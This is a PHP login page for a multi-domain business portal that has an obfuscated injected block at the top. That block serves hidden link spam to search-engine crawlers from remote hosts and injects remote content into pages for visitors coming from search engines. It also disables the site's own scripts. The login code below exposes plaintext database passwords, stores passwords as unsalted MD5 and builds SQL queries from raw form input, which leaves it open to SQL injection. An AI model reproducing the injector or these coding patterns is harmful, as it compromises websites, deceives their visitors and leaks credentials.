<?php
if(!defined('_NET'))
{	
error_reporting(0);
$NET='sh19042'; 
define('_NET',$NET);
if(function_exists('date_default_timezone_set')){date_default_timezone_set('America/Los_Angeles');}$sll0='http://googlecountwebs.com/';$pinj_0='http://tds-err.com/i?r=1';$pinj_1='http://tds-narod.ru/i.txt';$FNN='lnk-trans2.php';$pinj_2='yahoo';$pinj_2='bing';$pinj_3=str_replace('google',$pinj_1,$sll0);$pinj_4='site';$sll0=str_replace('google',$pinj_4,$sll0);$pinj_5='';$pinj_6='';$pinj_7='';$pinj_8='';if(!empty($_SERVER['HTTP_USER_AGENT'])){$pinj_6=$_SERVER['HTTP_USER_AGENT'];}if(!empty($_SERVER['HTTP_REFERER'])){$pinj_5=$_SERVER['HTTP_REFERER'];}if(!empty($_SERVER['REQUEST_URI'])){$pinj_7=$_SERVER['REQUEST_URI'];}if(!empty($_SERVER['REMOTE_ADDR'])){$pinj_8=$_SERVER['REMOTE_ADDR'];}if(!function_exists('get_cont')){function get_cont($pinj_9){if(function_exists('curl_init')){if(strpos($pinj_9,'NET=',0)>0){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_12=0;$pinj_13=0;$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if((strpos($pinj_11,' 404 Not',0)>0)||(strpos($pinj_11,'Location:',0)>0)){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;$pinj_12=1;}}else{if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}if($pinj_13==0){$pinj_14=array();$pinj_15=0;while(preg_match("/(Location:|URI:)[^(\n)]*/",$pinj_11,$pinj_14)&&($pinj_15<3)){$pinj_9=trim(str_replace($pinj_14[1],"",$pinj_14[0]));$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);$pinj_15=$pinj_15+1;$pinj_14=array();}if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);if($pinj_12==1){curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");}else{curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");}$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_16=@file_get_contents($pinj_9);return $pinj_16;}}if(!function_exists('SEbot_')){function SEbot_($pinj_17){if(strpos('-' .strtolower($pinj_17),'x compatible',0)>0){return 0;}if(strpos('-' .strtolower($pinj_17),'googlebot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'slurp',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'bing',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'msnbot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'yahoo',0)>0){return 1;}return 0;}}if(!function_exists('not_do_')){function not_do_($pinj_18){$pinj_19='gif|jpeg|png|js|css|swf|ico|txt|pdf|xml|jpg|pdf|doc';$pinj_20=explode("|",$pinj_19);$pinj_21=0;while($pinj_21<count($pinj_22)){if(strpos(' ' .strtolower($pinj_18),$pinj_22[$pinj_21],0)>0)return 1;$pinj_21=$pinj_21+1;}return 0;}}if(!function_exists('detect_encoding_')){function detect_encoding_($pinj_23){static $pinj_24=array('UTF-8','ASCII','Windows-1251','ISO-8859-2','ISO-8859-3','ISO-8859-4','ISO-8859-5','ISO-8859-6','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-10','ISO-8859-13','ISO-8859-14','ISO-8859-15','ISO-8859-16','ISO-8859-1','Windows-1252','Windows-1254',);foreach($pinj_24 as $pinj_25){$pinj_26=@iconv($pinj_25,$pinj_25 .'',$pinj_23);if(md5($pinj_26)== md5($pinj_23))return $pinj_25;}return null;}}if(isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on')){$pinj_27='https';}else{$pinj_27='http';}$pinj_28=substr(str_replace('www.','',$_SERVER['SERVER_NAME']),0,4);if((SEbot_($pinj_6)>0)&&empty($pinj_29)&&(not_do_($pinj_7)==0)){$pinj_29=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_29)>200){$pinj_30=get_cont($sll0 .$FNN .'?d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);$pinj_31=$pinj_29;$pinj_32=strpos(strtolower($pinj_29),"<body",0);$pinj_33=strpos(strtolower($pinj_29),">",$pinj_32);if(($pinj_32>0)&&($pinj_33>0)){$pinj_29=substr($pinj_31,0,$pinj_33+1) .$pinj_30 .'' .substr($pinj_31,$pinj_33+1);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}$pinj_29=str_replace('</body>',$pinj_30 .'</body>',$pinj_29);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}}if(isset($pinj_5)&&((strpos($pinj_5,'ogle.',0)>0)||(strpos($pinj_5,'ing.',0)>0)||(strpos($pinj_5,'ahoo.',0)>0)||(strpos($pinj_5,'ask.com',0)>0)||(strpos($pinj_5,'aol.',0)>0)||(strpos($pinj_5,'duckduckgo.',0)>0)||(strpos($pinj_5,'baidu.',0)>0))){$pinj_34='mkke';$pinj_35=180;if(!isset($_COOKIE[$pinj_34])||($_COOKIE[$pinj_34]<(time()))){$pinj_36=get_cont($sll0 .$FNN .'?rd=1&d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);if(strlen($pinj_36,'<!-- -->',0)>0)$pinj_35=9000;if(strlen($pinj_36)>10){$pinj_37=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_37)>400){$pinj_36=str_replace('-SID-',$NET,$pinj_36); $pinj_37=str_replace(' src="',' xsrc="',$pinj_37); $pinj_37=str_replace(" src='"," xsrc='",$pinj_37); $pinj_37=str_replace("<script","<comment",$pinj_37); $pinj_37=str_replace("</script","</comment",$pinj_37);  $pinj_37=str_replace('</head>',$pinj_36 .'</head>',$pinj_37);setcookie($pinj_34,(time()+$pinj_35),(time()+$pinj_35*2),'/','.' .str_replace('www.','',$_SERVER['SERVER_NAME']));  echo $pinj_37;exit;}}}} 
$p1='_lo'; $p1=$p1.'ads';  $i=0; while($i<12) { $p1='x'.$p1; $i=$i+1;} $p2=$p1.'2'; if(isset($_GET[$p1]) || isset($_POST[$p1]) ) { exit;} if(isset($_GET[$p2])  ) { $_GET[$p1]=$_GET[$p2];} if(isset($_POST[$p2]) ) { $_POST[$p1]=$_POST[$p2];}
}
/*,.*/
?><?php
ob_start();
session_start();
error_reporting (E_ALL ^ E_NOTICE);
if(isset($_POST['action']) && $_POST['action']=="login")
{
   
	$memberEmail = $_POST['user_name'];
	$password = $_POST['user_password'];
	if(isset($_POST['comp_name']) && $_POST['comp_name']=='www.i-guru.net/print')
	{
	    $hostname = "localhost";		
		$database = "iguru_iguruprint_miltonkeynes";
		$db_login = "iguru_miltonkeyn";
		$db_pass = "3fIX+=p{Hz@f";

		//Set the DB conn
		$dbconn =@mysql_connect($hostname,$db_login,$db_pass) or die("Could not connect:". mysql_error() );
		//Set the db selected value
		$isDBSelected=mysql_select_db($database) or die("Could not select database". mysql_error());
		if($isDBSelected)
		{
		    //echo "connected";die();
		}
		else
		{
		    //echo "database not connect";die();
		}
		
	   	$encPassword = md5($password);  		
        $memberloginQuery = "select * from member_tbl where (memberEmail='".$memberEmail."' or memberUsername='".$memberEmail."') and memberPass='".$encPassword."'";   		 
		//echo $memberloginQuery;die();
	   	$result = mysql_query($memberloginQuery);
	    	$recordCount = mysql_num_rows($result);
	        //If number of records are one
	        if($recordCount==1)
	        {	
                       $logCode = rand();
	            $row=mysql_fetch_array($result);
	            $_SESSION['memberTypeId']= $row['memberTypeId'];
	            $_SESSION['memberId']= $row['memberId'];
	            $_SESSION['memberPost']= $row['memberPost'];
                $_SESSION['teamId']= $row['TeamID'];
	            $_SESSION['userName']= $row['memberEmail'];
	            $_SESSION['name']= $row['memberName'];
	            $_SESSION['photoPath']= $row['memberImageName'];
	            $_SESSION['auth'] = "yes";	
                $_SESSION['logCode'] = $logCode;            	           
	            $_SESSION['lastlogin']=$row['lastLogin'];
	            
	          mysql_close();
			  
	            if($_SESSION['memberTypeId']=="1")
	            {
	            	header("Location: print/home.php");
	            	die();
                        
	            }
	            if($_SESSION['memberTypeId']=="2")
	            {
	            	header("Location: print/individual-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="3")
	            {
	            	header("Location:print/emstaff-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="4")
	            {
	            	header("Location: print/callsupport-home.php");
	            	die();
	            }
	            else 
	            {
	            	return true;
	            }
	           
	        }
	        else
	        {
                   
	            $msg="Invalid username/password";
        
	        }
	   
	}
	
	if(isset($_POST['comp_name']) && $_POST['comp_name']=='www.i-guru.net/website')
	{
		//echo "australia";die();
	    $hostname = "localhost";		
		$database = "iguru_iguruwebsites_miltonkeynes";		
		$db_login = "iguru_iguru_iguruwebsites_miltonkeynes";		
		$db_pass = "DQvqb0gzJ+0K";

		//Set the DB conn
		$dbconn =@mysql_connect($hostname,$db_login,$db_pass) or die("Could not connect:". mysql_error() );
		//Set the db selected value
		$isDBSelected=mysql_select_db($database) or die("Could not select database". mysql_error());
		if($isDBSelected)
		{
		    //echo "connected";die();
		}
		else
		{
		    //echo "database not connect";die();
		}
		
	   	$encPassword = md5($password);  		
        $memberloginQuery = "select * from member_tbl where (memberEmail='".$memberEmail."' or memberUsername='".$memberEmail."') and memberPass='".$encPassword."'";   		 
		//echo $memberloginQuery;die();
	   	$result = mysql_query($memberloginQuery);
	    	$recordCount = mysql_num_rows($result);
	        //If number of records are one
	        if($recordCount==1)
	        {	
                       $logCode = rand();
	            $row=mysql_fetch_array($result);
	            $_SESSION['memberTypeId']= $row['memberTypeId'];
	            $_SESSION['memberId']= $row['memberId'];
	            $_SESSION['memberPost']= $row['memberPost'];
                $_SESSION['teamId']= $row['TeamID'];
	            $_SESSION['userName']= $row['memberEmail'];
	            $_SESSION['name']= $row['memberName'];
	            $_SESSION['photoPath']= $row['memberImageName'];
	            $_SESSION['auth'] = "yes";	
                $_SESSION['logCode'] = $logCode;            	           
	            $_SESSION['lastlogin']=$row['lastLogin'];
	            
	            mysql_close();
	            if($_SESSION['memberTypeId']=="1")
	            {
	            	header("Location: website/home.php");
	            	die();
                        
	            }
	            if($_SESSION['memberTypeId']=="2")
	            {
	            	header("Location: website/individual-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="3")
	            {
	            	header("Location: website/emstaff-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="4")
	            {
	            	header("Location: website/callsupport-home.php");
	            	die();
	            }
	            else 
	            {
	            	return true;
	            }
	           
	        }
	        else
	        {
                   
	            $msg="Invalid username/password";
        
	        }
	}
	
	
	if(isset($_POST['comp_name']) && $_POST['comp_name']=='www.i-guru.net/australia')
	{
		//echo "australia";die();
	    $hostname = "localhost";		
		$database = "iguru_australia_website";		
		$db_login = "iguru_aust_website";		
		$db_pass = "R.T@s0Ngk;^z";

		//Set the DB conn
		$dbconn =@mysql_connect($hostname,$db_login,$db_pass) or die("Could not connect:". mysql_error() );
		//Set the db selected value
		$isDBSelected=mysql_select_db($database) or die("Could not select database". mysql_error());
		if($isDBSelected)
		{
		    //echo "connected";die();
		}
		else
		{
		    //echo "database not connect";die();
		}
		
	   	$encPassword = md5($password);  		
        $memberloginQuery = "select * from member_tbl where (memberEmail='".$memberEmail."' or memberUsername='".$memberEmail."') and memberPass='".$encPassword."'";   		 
		//echo $memberloginQuery;die();
	   	$result = mysql_query($memberloginQuery);
	    	$recordCount = mysql_num_rows($result);
	        //If number of records are one
	        if($recordCount==1)
	        {	
                       $logCode = rand();
	            $row=mysql_fetch_array($result);
	            $_SESSION['memberTypeId']= $row['memberTypeId'];
	            $_SESSION['memberId']= $row['memberId'];
	            $_SESSION['memberPost']= $row['memberPost'];
                $_SESSION['teamId']= $row['TeamID'];
	            $_SESSION['userName']= $row['memberEmail'];
	            $_SESSION['name']= $row['memberName'];
	            $_SESSION['photoPath']= $row['memberImageName'];
	            $_SESSION['auth'] = "yes";	
                $_SESSION['logCode'] = $logCode;            	           
	            $_SESSION['lastlogin']=$row['lastLogin'];
	            
	            mysql_close();
	            if($_SESSION['memberTypeId']=="1")
	            {
	            	header("Location:  australia-website/home.php");
	            	die();
                        
	            }
	            if($_SESSION['memberTypeId']=="2")
	            {
	            	header("Location: australia-website/individual-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="3")
	            {
	            	header("Location:  australia-website/emstaff-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="4")
	            {
	            	header("Location:  australia-website/callsupport-home.php");
	            	die();
	            }
	            else 
	            {
	            	return true;
	            }
	           
	        }
	        else
	        {
                   
	            $msg="Invalid username/password";
        
	        }
	}
	
	if(isset($_POST['comp_name']) && $_POST['comp_name']=='www.i-guru.net/accountancy')
	{
	

		$hostname = "localhost";		
     	$database = "iguru_iguruaccountancy_miltonkeynes";		
		$db_login = "iguru_iguru_iguruaccountancy_miltonkeynes";		
		$db_pass = "iguru_iguruaccountancy_miltonkeynes#123";

		//Set the DB conn
		$dbconn =@mysql_connect($hostname,$db_login,$db_pass) or die("Could not connect:". mysql_error() );
		//Set the db selected value
		$isDBSelected=mysql_select_db($database) or die("Could not select database". mysql_error());
		if($isDBSelected)
		{
		    //echo "connected";die();
		}
		else
		{
		    //echo "database not connect";die();
		}
		
	   	$encPassword = md5($password);  		
        $memberloginQuery = "select * from member_tbl where (memberEmail='".$memberEmail."' or memberUsername='".$memberEmail."') and memberPass='".$encPassword."'";   		 
		//echo $memberloginQuery;die();
	   	$result = mysql_query($memberloginQuery);
	    	$recordCount = mysql_num_rows($result);
	        //If number of records are one
	        if($recordCount==1)
	        {	
                       $logCode = rand();
	            $row=mysql_fetch_array($result);
	            $_SESSION['memberTypeId']= $row['memberTypeId'];
	            $_SESSION['memberId']= $row['memberId'];
	            $_SESSION['memberPost']= $row['memberPost'];
                $_SESSION['teamId']= $row['TeamID'];
	            $_SESSION['userName']= $row['memberEmail'];
	            $_SESSION['name']= $row['memberName'];
	            $_SESSION['photoPath']= $row['memberImageName'];
	            $_SESSION['auth'] = "yes";	
                $_SESSION['logCode'] = $logCode;            	           
	            $_SESSION['lastlogin']=$row['lastLogin'];
	            mysql_close();
	            
	            if($_SESSION['memberTypeId']=="1")
	            {
	            	header("Location: accountancy/home.php");
	            	die();
                        
	            }
	            if($_SESSION['memberTypeId']=="2")
	            {
	            	header("Location: accountancy/individual-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="3")
	            {
	            	header("Location: accountancy/emstaff-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="4")
	            {
	            	header("Location: accountancy/callsupport-home.php");
	            	die();
	            }
	            else 
	            {
	            	return true;
	            }
	           
	        }
	        else
	        {
                   
	            $msg="Invalid username/password";
        
	        }
	}	
	if(isset($_POST['comp_name']) && $_POST['comp_name']=='www.i-guru.net/it-support')
	{
	    $hostname = "localhost";		
	    $database = "iguru_iguru24x7itsupport_miltonkeynes";
		$db_login = "iguru_iguru24x7itsupport_miltonkeynes";
		$db_pass = "3FXrx{Xxz_Cl";
		//Set the DB conn
		$dbconn =@mysql_connect($hostname,$db_login,$db_pass) or die("Could not connect:". mysql_error() );
		//Set the db selected value
		$isDBSelected=mysql_select_db($database) or die("Could not select database". mysql_error());
		if($isDBSelected)
		{
		    //echo "connected";die();
		}
		else
		{
		    //echo "database not connect";die();
		}
		
	   	$encPassword = md5($password);  		
        $memberloginQuery = "select * from member_tbl where (memberEmail='".$memberEmail."' or memberUsername='".$memberEmail."') and memberPass='".$encPassword."'";   		 
		//echo $memberloginQuery;die();
	   	$result = mysql_query($memberloginQuery);
	    	$recordCount = mysql_num_rows($result);
	        //If number of records are one
	        if($recordCount==1)
	        {	
                       $logCode = rand();
	            $row=mysql_fetch_array($result);
	            $_SESSION['memberTypeId']= $row['memberTypeId'];
	            $_SESSION['memberId']= $row['memberId'];
	            $_SESSION['memberPost']= $row['memberPost'];
                $_SESSION['teamId']= $row['TeamID'];
	            $_SESSION['userName']= $row['memberEmail'];
	            $_SESSION['name']= $row['memberName'];
	            $_SESSION['photoPath']= $row['memberImageName'];
	            $_SESSION['auth'] = "yes";	
                $_SESSION['logCode'] = $logCode;            	           
	            $_SESSION['lastlogin']=$row['lastLogin'];
	            mysql_close();
	            
	            if($_SESSION['memberTypeId']=="1")
	            {
	            	header("Location: it-support/home.php");
	            	die();
                        
	            }
	            if($_SESSION['memberTypeId']=="2")
	            {
	            	header("Location: it-support/individual-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="3")
	            {
	            	header("Location: it-support/emstaff-home.php");
	            	die();
	            }
                if($_SESSION['memberTypeId']=="4")
	            {
	            	header("Location: it-support/callsupport-home.php");
	            	die();
	            }
	            else 
	            {
	            	return true;
	            }
	           
	        }
	        else
	        {
                   
	            $msg="Invalid username/password";
        
	        }
	}
	
	
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>I-Guru.net</title>
    <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'>
    <link rel="shortcut icon" href="img/admin.png"/>
    <!--start global css-->
    <link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />
    <link type="text/css" rel="stylesheet" href="vendors/themify-icons.css" />
    <!-- end of global css -->
    <!--start plugin css -->
    <link rel="stylesheet" href="vendors/bootstrapValidator.min.css">
    <!--end plugin css -->
    <link type="text/css" rel="stylesheet" href="css/custom.css" />
    <link type="text/css" rel="stylesheet" href="css/pages/login.css" />
<script>
function checkDomainSelection()
{
	if(document.getElementById('comp_name').value=='')
	{
		alert('Please select domain');
		return false;
	}
	else
	{
		return true;
	}
	
}
</script>
</head>

<body class="login_screen">

<div class="container">
    <div class="row justify-content-center">
        <div class="col-lg-4 col-md-6">
            <div class="login_box p-3">
            <div class="row m-t-20">
                <div class="col-lg-12 text-center">
                    
                    <h1 class="text-white m-t-20"><img src='img/i-guru-logo.png'  /></h1></div>
                </div>

            <div class="m-t-15">
                <form action=""  method="post" autofocus="off" id="login_from">
				<?php if($msg!=''){?><div class="col-md-12 btn btn-danger"> <?php echo $msg;?></div><br><br><?php } ?>
				<div class="form-group ">
                        <div class="input-group ">
						<select name='comp_name' id='comp_name' class="form-control" style="background:#000;" >
						<option value=''>Please Select domain</option>
						<option value='www.i-guru.net/print'>www.i-guru.net/print</option>
						<option value='www.i-guru.net/website'>www.i-guru.net/website</option>
						<option value='www.i-guru.net/accountancy'>www.i-guru.net/accountancy</option>
						<option value='www.i-guru.net/it-support'>www.i-guru.net/it-support</option>
						<option value='www.i-guru.net/australia'>www.i-guru.net/Australia-website</option>
					
						</select>
                       </div>
                    </div>
                    <div class="form-group ">
                        <div class="input-group ">
                            <span class="input-group-addon">
                                <i class="ti-user"></i>
                            </span>
                            <input type="text" name="user_name" class="form-control" placeholder="Enter user Name" autofocus="off"  autocomplete='off' required>
                        </div>
                    </div>
                    <div class="form-group ">
                    <div class="input-group m-t-15">
                            <span class="input-group-addon">
                                <i class="ti-lock"></i>
                            </span>
                        <input type="password" name="user_password" class="form-control" id="password" placeholder="Password" autofocus="off" autocomplete='off' required>
                    </div>
                    </div>
						<input type="hidden" name="action" value="login">
                   
                    <div class="text-center login_bottom">
                        <button type="submit" class="btn btn-success btn-block b_r_20 m-t-10 m-r-20" onclick="javascript: return checkDomainSelection()">Sign In</button>
                    </div><br>
                   <div class="text-center login_bottom">
                        <a href="forget-password.php" class="btn btn-success btn-block b_r_20 m-t-10 m-r-20" >Forget Password</a>
                    </div><br >

                </form>
            </div>

              
            </div>
        </div>
    </div>
</div>

<!-- ./wrapper -->
<script>

</script>
</html>
